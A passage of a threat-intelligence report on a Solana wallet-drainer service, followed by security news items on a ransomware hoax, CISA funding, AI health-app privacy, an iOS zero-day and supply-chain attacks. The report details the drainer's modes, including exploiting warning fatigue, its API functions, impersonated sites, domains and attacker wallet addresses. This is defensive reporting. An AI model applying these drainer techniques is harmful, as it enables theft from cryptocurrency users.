“Whitelist”: This mode is intended for domains explicitly whitelisted by Phantom, and is used in conjunction with other modes. When active on a whitelisted domain, it enables hidden draining and fake inbound token displays. If enabled on a non-whitelisted domain, Phantom blocks all draining activity, rendering the mode ineffective.

“Warning”: Unlike other modes that suppress warnings, this mode intentionally displays a Phantom warning banner while concealing the drain mechanics, aiming to exploit warning fatigue in users. A modal window instructs the user to proceed despite the warning. Default warnings include:
            
“This dApp could be malicious”
“You are approving over 200 transactions”

“This dApp could be malicious”

“You are approving over 200 transactions”

“Remove Phantom”: This mode restricts Phantom wallet use by hiding it from wallet selectors or blocking connection attempts.

The user can configure notifications in Telegram to notify them when a user visits their website, receives a withdrawal request, does not have funds, and more. Additionally, they can use the “Autosplit” feature, which will send any stolen funds directly to their private wallet, bypassing any intermediaries such as smart contracts or the shared Rublevka Team wallet, which is the default behavior. In this case, the profits are sent as they are, with each drained token being sent without conversion to the threat actor’s wallet.

Additionally, Rublevka Team provides an API (PiterAPI) stored in the piter variable within the JavaScript code to allow more advanced users to further customize drainer behavior. This API includes the following functions:

“connect”: Opens the modal window to connect to a victim’s wallet

“process”: Prompts the user to sign the transaction

“onConnect”: Sets the function to be called when a user connects their wallet

“getBalance,” “getAddress”: Gets victim wallet information

“setToken”: Sets up context for a specific token to be drained, including the token account address, mint, victim address, price, amount, and whether it’s an SPL-2022 token

Landing Pages and Content

Through the Telegram bot, Rublevka Team provides affiliates with an extensive catalog of landing pages available for use in their campaigns. As of October 2025, the Insikt Group identified 50 unique drainer landing pages and eleven “white” landing pages provided to affiliates. It is possible that additional landing pages have been added to the Telegram bot since then.

The drainer landing pages spoofed meme coin and stablecoin token airdrops, token mints, decentralized finance (DeFi) trading platforms, SOL staking services, and more. For the most part, the landing pages impersonate existing “legitimate” services, such as Axiom, Bitget, Photon, Jito, and Marinade. The landing pages also impersonate existing meme coin and social coin tokens for airdrops, including “Bonk,” “DogWifHat,” “Trump,” “Pengu,” and “Fartcoin.” The SOL-specific services pages typically reference SOL liquid staking, “burning” or “incineration,” faucets, airdrops, snipers, and multipliers. Generally, the landing pages included social media and informational links to the actual websites of the coins and services they were impersonating, likely to appear legitimate in a cursory check.

The landing page generator also included a panel for selecting a crypto wallet to connect to the malicious page, which prompts users to either connect an existing wallet or create a new one.

It is likely that these landing pages are used to lure victims to connect their wallet to the website, after which the embedded drainer script, index.js, will enumerate the wallet’s holdings, trick the user into signing a malicious transaction, and drain all held funds.

JavaScript Drainer Analysis

Based on Insikt Group’s analysis of the malicious landing pages, we identified that each page contained the file index.js (9c21d538c2a556f4a5b351b29f3513097ac57643f291ff6d751400d8dbc69489). This file is heavily obfuscated; Insikt Group assesses that the authors possibly used js-confuser, a free open-source JavaScript obfuscation tool with no available deobfuscator. However, Insikt Group was still able to identify strings of interest within the code, including indicators that may suggest parts of the script’s functionality.

The drainer includes the following URLs:

These are likely authorization calls to the Solana remote procedure call (RPC) API endpoints provided by RPC platforms Helius and WalletConnect, as well as the free Solana RPC endpoint provided by PublicNode. These endpoints are likely used to conduct the malicious drainer transactions. Notably, the Helius and WalletConnect URLs include API keys, as both services require sign-up and have various service tiers. As such, these API keys likely belong to Rublevka Team developers. The Solflare endpoint is likely used to connect to a victim’s wallet for enumeration and draining. The strings also included the domain efficient-endpoint[.]site (discussed further in the Domains and Infrastructure section below).

The drainer code also includes the following strings (verbatim):

Insikt Group also identified approximately 160 unique strings within the drainer that resembled SOL addresses. Of these, approximately 30 corresponded to known addresses in the SOL ecosystem, including system programs and token mints. The remaining approximately 130 addresses do not have any official SOL affiliation and are likely private addresses linked to attacker infrastructure. These addresses are discussed further in the Cryptocurrency Addresses section below.

Profits and Top Earners

According to the main chat channel, Rublevka Team has also operated a more private channel for “top earners” to receive “exclusive” information and landing pages. As of May 2025, the eligibility requirements for this channel are:

Having no less than ten TON in profit (the team was targeting TON during this time)

Being in the list of top 50 earners in the last ten days, which can be verified using a command in the [@]RublevkaTeam_bot

Being active in the team for no less than fourteen days, including providing traffic, contributing to the chat channel, or communicating with members of the support team

Having any Telegram username

Although a high number (approximately 14%) of “worker” names are hidden in the channel messages, Insikt Group was able to identify the top named earners in Rublevka Team based on the number of transactions posted to the channel, as well as based on the highest revenue per individual. The worker named “🇨🇦🇹🇷🇮🇷🇪🇪🇪🇺🇫🇮🇫🇷🇩🇪🇯🇵🇳🇱🇰🇷🇺🇸”, for example, has a total of 24,625 posts in the profits channel, the most among any other individual user, and has grossed $292,033.85 USD during their time in Rublevka Team. Other top posters include “Zatecky Gus 🍎🩸🍎🩸🍎🩸🍎🩸🍎🩸🍎🩸🍎” (9,804 posts valued at $95,106.91), “🍎🦮💥💥💥💥💥💥💥💥💥💥💥💥👀” (8,165 posts valued at $76,228.84), and others.

The top earner per the profits channel is the user “hard working guy”; though there are only 799 transactions associated with this user, they are valued at over $1.3 million. Multiple users within the “[RublevkaTeam] Chat” channel expressed amazement at this user’s high profits, with several users asking “hard working guy” to message them for collaboration and speculating on what type of traffic “hard working guy” uses to generate such high profits per transaction. However, “hard working guy” is not active within the chat channel, and several users have cast doubt on whether this user exists, or if they are a fake user created by Rublevka Team administrators to motivate other affiliates to “work harder.” The user “think about it” is a close second to “hard working guy”, with 145 transactions valued at $1.04 million. The next top earner, “Mr. Zelensky” (no relation to the President of Ukraine), made only $325,662.67 with 195 transactions, indicating a significant gradation between these earning tiers. This likely demonstrates the differing approaches between individual affiliates of Rublevka Team, which involve either extracting small sums of money from individual victims over a prolonged period or draining large quantities in fewer transactions.

Domains and Infrastructure

Insikt Group collected a sample of domains associated with Rublevka Team based on the Telegram bot and channels linked to the threat group. Based on proprietary sources, it is evident that Rublevka Team is constantly changing and rotating their infrastructure, including the domains used to host their shared pages for affiliate use, as well as other staging infrastructure to host aspects of their drainer. Over the last year, shared Rublevka Team domains have included:

Using open-source intelligence (OSINT) tools, Insikt Group identified approximately 70 unique subdomains historically associated with open-sol[.]cc, 400 associated with sol-hook[.]org, 300 associated with sol-galaxy[.]cc, 30 associated with web-core[.]cc, and 40 associated with sol-coin[.]xyz, as of writing. A cursory analysis of these domains’ hosting information showed that Rublevka Team primarily hides their shared infrastructure behind Cloudflare, with variation in registrars (using CNOBIN, Public Domain Registry, and an unspecified Hong Kong-based registrar). Notably, in November and December 2025, three of the domains (sol-galaxy[.]cc, web-core[.]cc, and sol-coin[.]xyz) migrated to IP address 158[.]94[.]208[.]165, registered to “Lanedonet Datacenter,” previously named “Metaspinner Net Gmbh.” Insikt Group recently identified Metaspinner net GmbH as a fraudulently registered hosting network that impersonated a legitimate German software company. Following RIPE NCC intervention, the network was re-registered under Lanedonet Datacenter. Insikt Group assessed with high confidence that Lanedonet Datacenter is operated by threat activity enabler (TAE) Virtualine Technologies.

Insikt Group also identified several domains used for Rublevka Team’s shared drainer backend hosting (“selfhost”) service: g-app-d[.]cc, fontmaxplugin[.]cc, and commontechrepo[.]cc. These domains are also behind Cloudflare and have obfuscated registration information. We identified approximately 60 unique subdomains under g-app-d[.]cc, approximately 20 under fontmaxplugin[.]cc, and approximately 40 under commontechrepo[.]cc, all of which followed the naming convention “[word1]-[word2].[domain].cc,” where “word1” and “word2” appeared to be randomly selected words. This is likely due to the specific domain generation algorithm (DGA) used by Rublevka Team to automatically spin up domains as they rotate them.

Insikt Group also identified the domain efficient-endpoint[.]site contained within the drainer file index.js. This domain was registered on September 24, 2025, and was hosted behind Cloudflare until December 12, 2025. After this date, the WHOIS record indicated it was registered via Namecheap to “Alexander Petrov,” with a physical address at 742 Evergreen Drive, Springfield, OR (likely fake), and the email address alex[.]petrov[.]domain[@]emailsecure[.]tech.

Insikt Group identified additional domains registered to this individual and email address, with over 900 registered since April 2025. These subdomains followed several DGA patterns since first being registered, including “[word 1]-[word 2]-[word 3]” and “[word 1][word 2][word 3]” (where each word is themed around decentralized finance and technology), “[word 1][word 2]”, and “[word 1]-[word 2]”. They used the top-level domains .xyz, .online, .site, .store, .space, .online, and .com.

The first website observed in OSINT sources registered to the email address alex[.]petrov[.]domain[@]emailsecure[.]tech is burn-shard-bridge[.]xyz, first observed on April 15, 2025. Around this time, the website displayed a “Connect Wallet” window similar to that observed in the Rublevka Team landing page generator, and an analysis of calls made by the website included /piter/visit and /piter/fetch, matching the name of the “Piter” drainer API described in Rublevka Team’s manual. We identified the following five additional domains that shared similar features and were registered to the same email address:

public-proof[.]online

highperformance-kit[.]online

instant-automated-matrix[.]website

highperformance-shard[.]online

All of these websites demonstrated similar behavior, including displaying the same “Connect Wallet” window, calls to the PiterAPI function openModal(), and references to a JavaScript file that is highly similar to the drainer analyzed by Insikt Group. Hashes for the JavaScript drainer files observed on these websites are included in Appendix A.

We assess that the domains registered to Alexander Petrov are possibly automatically generated infrastructure for use by Rublevka Team to host backend functions of their drainer operation, where the high volume of the domains is likely intended to enable the threat group to frequently rotate their infrastructure.

Cryptocurrency Addresses

Insikt Group identified a set of cryptocurrency addresses connected to Rublevka Team operations. Approximately 160 unique strings resembling SOL addresses were extracted from the JavaScript drainer attached to the team’s malicious landing pages, and several others were obtained by tracing transactions within affiliate screenshots showing proof of their payouts on forums and the “[RublevkaTeam] Chat” Telegram channel. We focused on the following addresses for further analysis:

EAsyxEjYKbDSVi6JbGYF1v9Jq1QyTSghRc8aqCeq7Ub3 (“Address A”, Transaction History)

EkaGjTVHDiRTYqSiup6TQs2QXfqSnEcrWN61dC8UVK21 (“Address B”, Transaction History)

CRnuwdpi3HGvFU5gGnvZAA9rV7AWe12v3sap8H3vXFY4 (“Address C”, Transaction History)

DD6vCVa4NEYRKA7K93rYZSKuY7REydFbqB3rog149ySx (“Address D”, Transaction History)

8e8kiGgEMCxYYx2vuSf2iPo859QjE7ojkY6yGWDez9pW (“Address E”, Transaction History)

4Ri6Rd7zN6M6H8jF3vPc6MqnmFioVcPaizZt3crLVGXd (“Address F”, Transaction History)

Insikt Group identified seventeen references to the above addresses in the Recorded Future Platform, all of which involved posts from users on social media and Telegram stating that those addresses had stolen crypto assets from them, with the earliest post dated July 10, 2025. One such post specifically named pumptoken[.]net as the phishing website that had initiated the transaction; via further historical analysis, Insikt Group identified a JavaScript file linked to this website (b9157f6bff6a6ee6ba5932ebac2c8796836b21eb3c69df08fbeb102e9228ba15) that had a high degree of similarity with the drainer file analyzed above, including the same obfuscation technique and overlap in listed addresses. We assess that these users were likely victims of Rublevka Team.

Both Address A and Address B were contained in the JavaScript drainer code as base64-encoded strings, indicating an attempt by the threat actor to further obfuscate these specific addresses, while all others were available in plaintext. Based on SOL blockchain data, Address A is listed as the “owner” for 31 of the identified addresses within the drainer JavaScript file, corresponding to its Associated Token Accounts (ATAs). As such, these ATAs are almost certainly used as part of the drainer logic. Additionally, the address appeared to be making a high number of conversions to wrapped SOL (wSOL), potentially to use on or swap to compatible blockchains. Insikt Group observed that in fall 2025, Address A followed a pattern of transferring large amounts in and out on the same day, with $50,000 to $80,000 moving through the wallet each day over a several-week period. On October 6, 2025, approximately $1.2 million worth of assets were transferred in and out of the address. This pattern suggests that the wallet was likely used by Rublevka Team as a conduit for transferring and laundering stolen funds before cashing them out. Based on SOL blockchain data, the address first came into use in September 2025.

Insikt Group also identified an account associated with Address A on pump[.]fun, a platform for users to launch their own meme coins. This account holds low balances in over 600 tokens and was first funded by a transaction from Fixed Float Exchange on September 22, 2025.

The account associated with Address B currently holds over 100 tokens and is associated with a high volume of token swap activity. Notably, Address B’s first funder is Address C, which was mentioned in several social media posts as a malicious wallet between July and August 2025. It was also mentioned in a Reddit thread from August 2025, where users discussed having their funds stolen. One user stated that they were signing up for Axiom and connected their Phantom wallet to the service website, and once they authenticated the service took $50 worth of SOL from their wallet and transferred it to Address C. Based on the wallet address and TTPs (using an Axiom-themed landing page and Phantom wallet), we assess that this individual was likely another victim of Rublevka Team.

Insikt Group identified Addresses D and E in several affiliate reviews of Rublevka Team, namely in posts showing proof of funds disbursement to their personal wallets from those addresses. These addresses also appeared in screenshots of the [@]RublevkaTeam_bot “profits” notifications, posted by individual affiliates to the chat channel, many of which did not obfuscate the victim wallet ID, allowing Insikt Group to trace the transaction. Several of these transactions were made directly to Address D and E. Based on this, we assess that these are likely two of the “shared” Rublevka addresses used to collect stolen assets and then disburse affiliates’ cuts. We also note that Address E is the first funder of Address D.

In addition to the above, Insikt Group identified 28 abuse reports for SOL addresses contained in the drainer file (including Addresses A to E) within other open sources, made between April and October 2025. Users reported a variety of scams in which these addresses drained their funds. These scams involved web pages shared on Telegram, social media, and crypto investment advice groups that prompted users to connect their wallets and sign transactions, resulting in the loss of all their funds. The TTPs and timeframe described in these reports match those associated with Rublevka Team, and we assess that these reports were highly likely made by Rublevka Team victims. Notably, in at least one report, users reported that in addition to their wallet funds being drained, they experienced a breach of their personal data and accounts; this may indicate that some Rublevka Team affiliates possibly conduct additional follow-on activity as part of their scams, such as credential theft. For a full list of the domains and malicious social media accounts listed in these reports, see Appendix C.

A complete list of SOL addresses extracted from the drainer script can be found in Appendix D; this section excludes addresses corresponding to SOL system programs and official token mints.

Rublevka Team represents the maturation of cybercrime-as-a-service within the cryptocurrency threat landscape, signaling that sophisticated social engineering and scalable infrastructure now rival malware as the primary tool set for digital asset theft. As this affiliate-driven drainer ecosystem continues to expand, we expect similar models to proliferate across other blockchain ecosystems and decentralized platforms, particularly those with low transaction fees and fast settlement times, such as SOL. The low barrier to entry, combined with high financial incentives, will continue to attract a global pool of cybercriminals, accelerating the volume, complexity, and geographic diversity of crypto-targeted scams in the near term.

Looking ahead, brand impersonation campaigns tied to crypto drainers will become a strategic reputational risk for exchanges, Web3 platforms, and fintech providers. The effectiveness of these spoofing campaigns, especially those that mimic legitimate token airdrops or DeFi services, will continue to erode user trust in the broader crypto ecosystem. As threat actors like Rublevka Team improve their social engineering tactics, abuse of RPC APIs, and cloaking techniques to bypass detection, more platforms will likely come under regulatory pressure to implement proactive monitoring, takedown partnerships, and user verification mechanisms to mitigate liability.

[25] Cyberscoop - 0APT ransomware group rises swiftly with bluster, along with genuine threat of attack
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 11 Feb 2026 22:29:26 +0000
Link: https://cyberscoop.com/0apt-ransomware-group-hoax-technical-capabilities/

[TAM METİN - 945 kelime]
Ransomware groups crop up like weeds, angling for striking positions in a crowded field rife with turnover, infighting and unbridled competition. Yet, they rarely emerge, as 0APT did late last month, claiming roughly 200 victims out of the gate.

Researchers have thus far seen no evidence confirming 0APT attacked any of its alleged victims, which includes high-profile organizations. Alleged victim data samples and the structure and size of placeholder file trees published by 0APT place further doubt on the group’s supposed criminal escapades.

Most signs suggest the group is running a massive hoax, but at least some of the threat 0APT poses is grounded in truth. The group’s inflated pretense may be a ruse to create a sense of momentum, gain recognition and attract affiliates.

“While 0APT is probably bluffing about the victims it has already compromised, it is not bluffing on the technical capabilities of its actual ransomware,” Cynthia Kaiser, senior vice president at Halcyon’s ransomware research center, told CyberScoop.

0APT’s infrastructure is sound, including cryptographically strong and fully operational ransomware binaries, unique code and a well organized panel for affiliates, she said. “Even if researchers assess most claimed victims as fabricated, the underlying ransomware payload represents genuine risk to any organization that encounters it.”

The group’s outlandish claims accentuates the messy state of ransomware, with researcher interest and widespread fear among potential victims — perceived or real — delivering benefits for criminal syndicates that compete for mindshare and co-conspirators.

0APT’s apparent swift rise with a massive alleged victim count that hovered around 200 organizations within its first week online caught the attention of multiple ransomware research firms, resulting in reports this week by Halcyon and GuidePoint Security.

Researchers roundly consider the group’s initial claims an act of deception. This pattern of claiming a high number of victims without substantiating evidence surfaced last year with other ransomware groups, including Babuk2 and FunkSec, which eventually disclosed confirmed victims.

“After those initial fake lists, we started to see legitimate victims as the gangs attracted affiliates and matured into fully functioning ransomware-as-a-service organizations,” Kaiser said.

GuidePoint researchers acknowledge 0APT could evolve into a genuine problem, but they are more dismissive of the group’s capabilities.

Justin Timothy, principal threat intelligence consultant at GuidePoint, said 0APT’s encryptor isn’t unique or noteworthy amongst its ransomware peers.

“The ransomware encryptor is only one piece of the attack kill chain,” he said. “Threat actors still need to be able to obtain initial access, escalate privilege, and move laterally all while evading detection and endpoint detection and response. These aspects can often take more skill and technical knowledge compared to the creation of encryption malware.”

While 0APT might be running a scam, it doesn’t appear to be a fly-by-night operation.

The group’s alleged victims are opportunistic and predominantly operate in critical infrastructure and data-rich sectors, according to Halcyon. Most of the claimed victims are based in the United States, and the top sectors targeted include health care, professional services, technology, transportation and logistics, energy and manufacturing.

0APT has been consistently adding and removing alleged victims from its data-leak site, which went offline briefly before returning earlier this week with a much lower victim count.

“The group’s early claims appear to focus more on gaining visibility and momentum, believing those will recruit affiliates faster than validity,” Kaiser said.

Attracting affiliates and attention for future operations could be driving some of 0APT’s behavior, but cybercriminals frequently deride such activities once the extent of their lies becomes widely known, said Jason Baker, managing security consultant of threat intelligence at GuidePoint.

“That strategy was almost certainly shortsighted and undermined by 0APTs fabrications, which render them an unattractive partner or destination for affiliates going forward,” Baker said. “After all, if they’re willing to lie this brazenly about their victims and capabilities, why wouldn’t they lie to their affiliates as well?”

The make-up of 0APT remains unknown, with no obvious lineage or overlap with other ransomware variants, but the group is financially motivated and very aggressive in communications, Kaiser said.

“While the operators appear to not be novices, we have no evidence of who is running the group or its exact origins,” she added.

Halcyon, which is developing technical analysis on the group, insists 0APT poses a genuine threat that will eventually ensnare legitimate victims.

“Given the fact that they are attracting attention and operating a capable encryptor, we see the potential as high that real victims may soon appear,” Kaiser said. A focused rebrand, such as removing all the fake victims and starting to list real victims, even only a few, will be a strong signal that the group has evolved into a serious operation.”

[26] Cyberscoop - Acting CISA chief says DHS funding lapse would limit, halt some agency work
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 11 Feb 2026 22:04:31 +0000

[TAM METİN - 669 kelime]
Another Department of Homeland Security shutdown would hamper the Cybersecurity and Infrastructure Security Agency’s ability to respond to threats, offer services, develop new capabilities and finish writing a key regulation, its acting director told Congress Wednesday.

Some of those activities would continue on a limited basis, while others would halt entirely, acting CISA leader Madhu Gottumukkala testified before the House Appropriations Subcommittee on Homeland Security.

“A lapse in funding would impede CISA’s ability to perform … good work,” he told the panel. “When the government shuts down, our adversaries do not.”

As lawmakers held the hearing, DHS was hurtling toward another potential shutdown as Democrats and Republicans clashed over Trump administration immigration policies and enforcement, with a focus most recently on the massive influx of DHS officers in Minneapolis, where those officers have killed multiple U.S. citizens.

Republicans said at the hearing the testimony should persuade Democrats to fund DHS, since its border operations are largely funded by last year’s budget reconciliation law and a shutdown would mainly harm DHS’s other agencies. Democrats said the hearing was “for show,” as they have put forward proposals to fund the rest of DHS as the immigration debate continues — and as 90% of DHS would continue operating under a shutdown, as the panel’s top Democrat, Henry Cuellar of Texas, asserted.

Gottumukkala said CISA planned to designate 888 of its 2,341 employees as “excepted,” meaning they could continue to work during a shutdown, albeit without pay.

“We will do everything we can to meet our mission during the shutdown,” he said. “Uncertainty and those missed paychecks are a serious hardship.”

CISA has reduced its personnel by a third under the second presidency of Donald Trump.

A shutdown “would delay deploying cybersecurity services and capabilities to federal agencies, leaving significant gaps in security programs,” Gottumukkala said in his written testimony. “CISA’s capacity to provide timely and actionable guidance to help partners defend their networks would be degraded.”

There’s a divide between activities CISA could continue in some capacity versus those they would have to shutter entirely during a funding lapse, he said.

“Limited activities include responding to imminent threats, sharing timely vulnerability and incident information, maintaining our 24/7 operations center, and operating cybersecurity shared services,” Gottumukkala said. “However, CISA would not perform any strategic planning, development of cybersecurity advice and guidance, or development of new technical capabilities.”

There would likely be delays in activities like issuing binding operational directives to federal agencies or completing the already-delayed regulations stemming from the Cyber Incident Reporting for Critical Infrastructure Act (CIRCIA), the latter of which would require critical infrastructure operators to report major cyber incidents to CISA and would be paused during a shutdown, he said.

Gottumukkala’s testimony is the latest before Congress to focus on personnel at CISA. The chairman of the Appropriations subcommittee, Rep. Mark Amodei, R-Nev., chided Gottumukkala for what he said were delays in CISA providing a reorganization plan to the panel.

“We’ve been professional. We’ve been respectful,” Amodei said. “We expect exactly the same thing in return.”

[27] Cyberscoop - Your AI doctor doesn’t have to follow the same privacy rules as your real one
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 11 Feb 2026 19:51:01 +0000

[TAM METİN - 1570 kelime]
AI apps are making their way into healthcare. It’s not clear that rigorous data security or privacy practices will be part of the package.

OpenAI, Anthropic and Google have all rolled out AI-powered health offerings from over the past year. These products are designed to provide health and wellness advice to individual users or organizations, helping to diagnose their illnesses, examine medical records and perform a host of other health-related functions.

OpenAI says that hundreds of millions of people already use ChatGPT to answer health and wellness questions, and studies have found that large language models can be remarkably proficient at medical diagnostics, with one paper calling their capabilities “superhuman” when compared to a human doctor.

But in addition to traditional cybersecurity concerns around how well these chatbots can protect personal health data, there are a host of questions around what kind of legal protections users would have around the personal medical data they share with these apps. Several health care and legal experts told CyberScoop that these companies are almost certainly not subject to the same legal or regulatory requirements – such as data protection rules under the Health Insurance Portability and Accountability Act (HIPAA) – that compel hospitals and other healthcare facilities to ensure protection of your data.

Sara Geoghegan, senior counsel at the Electronic Privacy Information Center, said offering the same or similar data protections as part of a terms of service agreement is markedly different from interacting with a regulated healthcare entity.

“On a federal level there are no limitations – generally, comprehensively – on non-HIPAA protected information or consumer information being sold to third parties, to data brokers,” she said.

She also pointed to data privacy concerns that stemmed from the bankruptcy and sale of genetic testing company 23andMe last year as a prime example of the dangers consumers face when handing over their sensitive health or biometric data to a unregulated entity.

In many cases, these AI health apps carry the same kind of security and privacy risks as other generative AI products: data leakage, hallucinations, prompt injections and a propensity to give confident but wrong answers.

Additionally, data breaches in the healthcare industry have become increasingly common over the past several years, even before the current AI boom. Healthcare organizations are frequent targets for hacking, phishing, and ransomware, and even though companies can be held legally responsible under HIPAA for failing to protect patient data, breaches still happen because many systems rely on outdated software, depend on numerous outside vendors, and struggle to keep up with the cost and complexity of strong cybersecurity.

Carter Groome, CEO of First Health Advisory, a healthcare and cybersecurity risk management consulting firm, said that beyond concerns over whether these tech companies can even reasonably promise to protect your health data, it’s also not clear their security protections are anything more than a company policy.

“They’re not mandated by HIPAA,” Groome said. “Organizations that are building apps, there’s a real gray area for any sort of compliance” with health care data privacy laws.

Privacy is especially important in health and medicine, both for protecting sensitive medical information and for building trust in the health system overall. That’s why hospitals, doctor’s offices, lab testing facilities and other associated entities have been subject to heightened laws and regulations around protecting patient records and other health data.

Laws like HIPAA require covered entities and their business associates to “maintain reasonable and appropriate administrative, physical, and technical safeguards for the security of certain individually identifiable health information.”

It also subjects companies to breach notification rules that force them to notify victims, the Department of Health and Human Services and in some cases the public when certain health data has been accessed, acquired, used or disclosed in a data breach.

Groome and Andrew Crawford, senior counsel at Center for Democracy and Technology’s Data and Privacy Project, said that tech companies like OpenAI, Anthropic and Google almost certainly would not be considered covered entities under HIPAA’s security rule, which according to HHS applies to health plans, clearinghouses, health care providers and business associates who transfer Electronic Protected Health Information (ePHI).

OpenAI and Anthropic do not claim that ChatGPT Health or Claude for Healthcare follow HIPAA. Anthropic’s web site describes Claude for Healthcare as “built on HIPAA-ready infrastructure,” while OpenAI’s page for its suite of healthcare-related enterprise products claims they “support” HIPAA compliance.OpenAI, Anthropic and Google did not respond to a request for comment from CyberScoop.

That distinction means “that a number of companies not bound by HIPAA’s privacy protections will be collecting, sharing, and using peoples’ health data,” Crawford said in a statement to CyberScoop. “And since it’s up to each company to set the rules for how health data is collected, used, shared, and stored, inadequate data protections and policies can put sensitive health information in real danger.”

Laws like HIPAA contain strong privacy protections for health data but are limited in scope and “meant to help the digitization of records, not stop tech companies from gathering your health data outside of the doctor’s office,” Geoghegan said.

As they expand into healthcare, tech companies like OpenAI, Anthropic, and Google have emphasized data security as a top priority in their product launches.

OpenAI said their health model uses an added layer of built encryption and isolation features to compartmentalize health conversations, as well as added features like multifactor authentication. And, like other OpenAI models, ChatGPT Health encrypts its data at rest and in transit, has a feature to delete chats within 30 days and promises your data won’t be used for AI training.

For uploading medical records, OpenAI said it is partnering with b.well, an AI-powered digital health platform that connects health data for U.S. patients. On its website, the company says “it uses a transparent, consumer-friendly privacy policy that lets users control and change data-sharing permissions at any time, does not sell personal data, and only shares it without permission in limited cases. It also voluntarily follows the CARIN Alliance Trust Framework and Code of Conduct—making it accountable to the FTC—and says it aims to meet or exceed HIPAA standards through measures like encryption, regular security reviews, and HITRUST and NIST CSF certifications, though it notes no system can fully eliminate cyber risk.

Legal experts say that when tech companies promise their AI products are “HIPAA compliant” or “HIPAA ready,” it’s often unclear whether these claims amount to anything more than a promise not to use health data irresponsibly.

These distinctions matter when it comes to personal health data. Geoghegan said it is not uncommon in some corners of the wellness industry for an unregulated business to ambiguously claim they are “HIPAA-compliant” to elude the fact that they aren’t legally bound by the regulations.

“Generally speaking, a lot of companies say they’re HIPAA compliant, but what they mean is that they’re not a HIPAA regulated entity, therefore they have no obligation,” said Geoghegan.

Groome suggested that AI companies are being “hyperbolic” in their commitment to security in an effort to assuage the concerns of privacy critics, noting that their product announcements contain “a comical level of how much they say they’re going to protect your information.”

An added wrinkle is that AI tools remain black boxes in some respects, with even their developers unable to fully understand or explain how they work. That kind of uncertainty, especially with healthcare data, can lead to bad security or privacy outcomes.

“It’s really shaky right now when a company comes out and says ‘we’re fully HIPAA compliant’ and I think what they’re doing is trying to give the consumer a false sense of trust,” said Groome.

Several sources told CyberScoop that despite these risks, they expect AI health apps to continue being widely used, in part because the traditional American healthcare system remains so expensive.

AI tools – by contrast – are convenient, immediate and cost effective. While people like Geoghegan and Groome have said they are sympathetic to the pressures that push people towards these apps, the tradeoffs are troubling.

“A lot of this stems from the fact that care is inaccessible, it’s hard to get and it’s expensive, and there are many reasons why people don’t trust in health care provisions,” said Geoghegan. “But the solution to that care being inaccessible cannot be relying on big tech and billionaire’s products. We just can’t trust [them] to have our best health interest in mind.”

[28] The Register - Apple patches decade-old iOS zero-day, possibly exploited by commercial spyware

Apple patches decade-old iOS zero-day, possibly exploited by commercial spyware

Flaw abused 'in an extremely sophisticated attack against specific targeted individuals'

Apple patched a zero-day vulnerability affecting every iOS version since 1.0, used in what the company calls an "extremely sophisticated attack" against targeted individuals.

CVE-2026-20700, discovered by Google's Threat Analysis Group, affects dyld - Apple's dynamic linker - and allows attackers with memory write capability to execute arbitrary code. Apple said the flaw was exploited in the wild and may have been part of an exploit chain.

Its advisory stated: "An attacker with memory write capability may be able to execute arbitrary code. Apple is aware of a report that this issue may have been exploited in an extremely sophisticated attack against specific targeted individuals on versions of iOS before iOS 26."

Google's researchers also referenced two December vulnerabilities in their report that both carry 8.8 CVSS scores.

CVE-2025-14174 is an out-of-bounds memory access flaw in Google Chrome's ANGLE graphics engine on Mac that could be exploited through a malicious webpage.

The other, CVE-2025-43529, is a use-after-free leading to code execution.

Brian Milbier, deputy CISO at Huntress, said: "Think of dyld as the doorman for your phone. Every single app that wants to run must first pass through this doorman to be assembled and given permission to start.

"Usually, the doorman checks credentials and places apps in a high-security 'sandbox' where they can't touch your private data. This vulnerability allows an attacker to trick the doorman into handing over a master key before security checks even begin."

Two Android 0-day bugs disclosed and fixed, plus 105 more to patch

By chaining this with WebKit flaws Apple also addressed in the iOS 26.3 update, "attackers have created a 'zero-click' or 'one-click' path to total control. They use a fake ID to bypass the front gate – your browser – and then exploit the doorman's flaw to take over the entire building," Milbier added.

"This level of sophistication resembles other exploits developed by the commercial surveillance industry. These are private companies that also developed prominent spyware tools like Pegasus and Predator. They sell these types of exploits or tools to government clients. While some updates in this patch address minor issues, such as data leakage from physical access, the dyld/WebKit chain is in a different league. iOS 26.3 closes a door that has been unlocked for over a decade."

Apple's updates for iOS and iPadOS also feature a host of other fixes for various bugs, including flaws that grant root access and disclose sensitive user information, but CVE-2026-20700 is the only one it said was exploited in the wild. ®

Supply chain attacks now fuel a 'self-reinforcing' cybercrime economy

Researchers say breaches link identity abuse, SaaS compromise, and ransomware into a cascading cycle

Cybercriminals are turning supply chain attacks into an industrial-scale operation, linking breaches, credential theft, and ransomware into a "self-reinforcing" ecosystem, researchers say.

In its latest trends report, Group-IB reckons individual strikes that lead to broader downstream compromises of businesses are now interconnected as cyberbaddies pursue multiple methods to breach vendors and service providers.

Supply chain hacks like the recent Shai-Hulud NPM worm, Salesloft debacle, or the OpenClaw package poisoning are fast becoming the primary goals of the criminal fraternity who try to exploit the inherited access to a victim's customers.

"Open source package compromise feeds malware distribution and credential theft," the research states. "Phishing and OAuth abuse enable identity compromise that unlocks SaaS and CI/CD environments. Data breaches supply the credentials, context, and relationships needed to refine impersonation and lateral movement. Ransomware and extortion arrive later in the chain, capitalizing on access and intelligence gathered earlier. Each stage strengthens the next, creating a self-reinforcing cycle of supply chain exploitation."

Over the next year, GroupIB predicts supply chain attacks will be executed faster thanks to AI-assisted tools that can scan for vulnerabilities across vendors, CI/CD pipelines, and browser extension marketplaces at machine speed.

It also expects to see traditional malware replaced by identity attacks, whereby criminals set themselves up as genuine users and their activity blends into the normal daily business functions, evading detection for longer periods.

Platforms offering HR, CRM, and ERP, as well as MSPs, are high-priority targets, Group-IB says, as a single compromise can lead to hackers gaining access to hundreds of customers.

Evolution of data breaches

The Salesloft breach, as well as the Oracle compromise of March 2025, are examples of how data breaches are shifting from a single-reward model to one where access is used for additional compromises.

Instead of taking one big wedge of data and demanding an extortion payment, criminals took their time to collect OAuth tokens and exploit misconfigured partner connections to move laterally. They then target downstream customers, steal their data and contact lists to repeat the cycle, or, in cases involving NPM and similar ecosystems, serve malicious updates to users to carry out fraud at scale.

"Cybercrime is no longer defined by single breaches. It is defined by cascading failures of trust," said Dmitry Volkov, Group-IB CEO.

"Attackers are industrializing supply chain compromise because it delivers scale, speed, and stealth. A single upstream breach can now ripple across entire industries. Defenders must stop thinking in terms of isolated systems and start securing trust itself, across every relationship, identity, and dependency."

